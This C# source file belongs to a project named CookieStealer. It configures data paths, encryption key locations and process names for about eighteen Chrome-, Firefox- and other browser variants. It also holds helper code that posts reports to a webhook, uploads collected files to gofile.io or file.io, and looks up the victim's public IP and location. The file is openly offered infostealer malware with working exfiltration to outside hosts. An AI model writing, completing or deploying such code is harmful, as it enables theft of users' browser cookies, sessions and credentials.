using System.Text;
using System.Text.Json;
using System.Net;

namespace CookieStealer;

public static class Config
{
    public const string WEBHOOK_URL = "addwebhookkral";

    public static readonly string OUTPUT_BASE_DIR = Path.Combine(
        Environment.GetEnvironmentVariable("TEMP") ?? ".",
        $"Browser-Datas-{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}");
        
    public static readonly Dictionary<string, BrowserInfo> BROWSERS = new()
    {
        ["chrome"] = new("Google Chrome", "chromium", @"AppData\Local\Google\Chrome\User Data", @"AppData\Local\Google\Chrome\User Data\Local State", "chrome.exe", "Google Chromekey1"),
        ["brave"] = new("Brave", "chromium", @"AppData\Local\BraveSoftware\Brave-Browser\User Data", @"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State", "brave.exe", "Brave Softwarekey1"),
        ["edge"] = new("Microsoft Edge", "chromium", @"AppData\Local\Microsoft\Edge\User Data", @"AppData\Local\Microsoft\Edge\User Data\Local State", "msedge.exe", "Microsoft Edgekey1"),
        ["opera"] = new("Opera", "chromium", @"AppData\Roaming\Opera Software\Opera Stable", @"AppData\Roaming\Opera Software\Opera Stable\Local State", "opera.exe", "Opera Softwarekey1"),
        ["opera_gx"] = new("Opera GX", "chromium", @"AppData\Roaming\Opera Software\Opera GX Stable", @"AppData\Roaming\Opera Software\Opera GX Stable\Local State", "opera.exe", "Opera Softwarekey1"),
        ["firefox"] = new("Firefox", "gecko", @"AppData\Roaming\Mozilla\Firefox\Profiles", null, "firefox.exe", null),
        ["chrome_beta"] = new("Google Chrome Beta", "chromium", @"AppData\Local\Google\Chrome Beta\User Data", @"AppData\Local\Google\Chrome Beta\User Data\Local State", "chrome.exe", "Google Chrome Betakey1"),
        ["chromium"] = new("Chromium", "chromium", @"AppData\Local\Chromium\User Data", @"AppData\Local\Chromium\User Data\Local State", "chrome.exe", "Chromiumkey1"),
        ["vivaldi"] = new("Vivaldi", "chromium", @"AppData\Local\Vivaldi\User Data", @"AppData\Local\Vivaldi\User Data\Local State", "vivaldi.exe", "Vivaldikey1"),
        ["yandex"] = new("Yandex Browser", "chromium", @"AppData\Local\Yandex\YandexBrowser\User Data", @"AppData\Local\Yandex\YandexBrowser\User Data\Local State", "browser.exe", "Yandex Browserkey1"),
        ["coccoc"] = new("CocCoc Browser", "chromium", @"AppData\Local\CocCoc\Browser\User Data", @"AppData\Local\CocCoc\Browser\User Data\Local State", "browser.exe", "CocCoc Browserkey1"),
        ["qq"] = new("QQ Browser", "chromium", @"AppData\Local\Tencent\QQBrowser\User Data", @"AppData\Local\Tencent\QQBrowser\User Data\Local State", "QQBrowser.exe", "QQ Browserkey1"),
        ["360speed"] = new("360 Speed", "chromium", @"AppData\Local\360Chrome\Chrome\User Data", @"AppData\Local\360Chrome\Chrome\User Data\Local State", "360chrome.exe", "360 Speedkey1"),
        ["360secure"] = new("360 Secure", "chromium", @"AppData\Local\360Chrome\Chrome\User Data", @"AppData\Local\360Chrome\Chrome\User Data\Local State", "360chrome.exe", "360 Securekey1"),
        ["firefox_beta"] = new("Firefox Beta", "gecko", @"AppData\Roaming\Mozilla\Firefox\Profiles", null, "firefox.exe", null),
        ["firefox_dev"] = new("Firefox Developer", "gecko", @"AppData\Roaming\Mozilla\Firefox\Profiles", null, "firefox.exe", null),
        ["firefox_esr"] = new("Firefox ESR", "gecko", @"AppData\Roaming\Mozilla\Firefox\Profiles", null, "firefox.exe", null),
        ["firefox_nightly"] = new("Firefox Nightly", "gecko", @"AppData\Roaming\Mozilla\Firefox\Profiles", null, "firefox.exe", null),
    };
}

public record BrowserInfo(string Name, string Type, string DataPath, string? LocalState, string ProcessName, string? KeyName);

public static class WebhookHelper
{
    private static readonly HttpClient _http = new();

    public static void SendWebhook(object payload)
    {
        if (string.IsNullOrEmpty(Config.WEBHOOK_URL)) { Console.WriteLine("[!] WEBHOOK_URL not set, skipping report."); return; }
        try
        {
            string json = JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            _http.DefaultRequestHeaders.UserAgent.TryParseAdd("Mozilla/5.0");
            var response = _http.PostAsync(Config.WEBHOOK_URL, content).Result;
            if (response.StatusCode == HttpStatusCode.NoContent || response.StatusCode == HttpStatusCode.OK)
                Console.WriteLine("[+] Report sent to Webhook successfully.");
            else
                Console.WriteLine($"[-] Webhook returned status code: {(int)response.StatusCode}");
        }
        catch (Exception e) { Console.WriteLine($"[-] Error sending webhook: {e.Message}"); }
    }

    public static string? UploadFile(string filePath)
    {
        try
        {
            // Try Gofile
            try
            {
                var serversJson = _http.GetStringAsync("https://api.gofile.io/servers").Result;
                using var doc = JsonDocument.Parse(serversJson);
                if (doc.RootElement.GetProperty("status").GetString() == "ok")
                {
                    var servers = doc.RootElement.GetProperty("data").GetProperty("servers");
                    string server = servers[0].GetProperty("name").GetString()!;

                    using var form = new MultipartFormDataContent();
                    form.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "file", Path.GetFileName(filePath));
                    var response = _http.PostAsync($"https://{server}.gofile.io/uploadFile", form).Result;
                    var result = JsonDocument.Parse(response.Content.ReadAsStringAsync().Result);
                    if (result.RootElement.GetProperty("status").GetString() == "ok")
                        return result.RootElement.GetProperty("data").GetProperty("downloadPage").GetString();
                }
            }
            catch (Exception e) { Console.WriteLine($"Gofile upload failed: {e.Message}"); }

            // Fallback to file.io
            try
            {
                using var form = new MultipartFormDataContent();
                form.Add(new ByteArrayContent(File.ReadAllBytes(filePath)), "file", Path.GetFileName(filePath));
                var response = _http.PostAsync("https://file.io", form).Result;
                var result = JsonDocument.Parse(response.Content.ReadAsStringAsync().Result);
                if (result.RootElement.TryGetProperty("success", out var success) && success.GetBoolean())
                    return result.RootElement.GetProperty("link").GetString();
            }
            catch (Exception e) { Console.WriteLine($"File.io upload failed: {e.Message}"); }
        }
        catch (Exception e) { Console.WriteLine($"Error in upload_file: {e.Message}"); }
        return null;
    }

    public static Dictionary<string, string> GetPublicIpInfo()
    {
        try
        {
            string json = _http.GetStringAsync("http://ip-api.com/json/").Result;
            return JsonSerializer.Deserialize<Dictionary<string, string>>(json) ?? new() { ["query"] = "N/A" };
        }
        catch { return new() { ["query"] = "N/A", ["city"] = "N/A", ["country"] = "N/A", ["isp"] = "N/A" }; }
    }
}
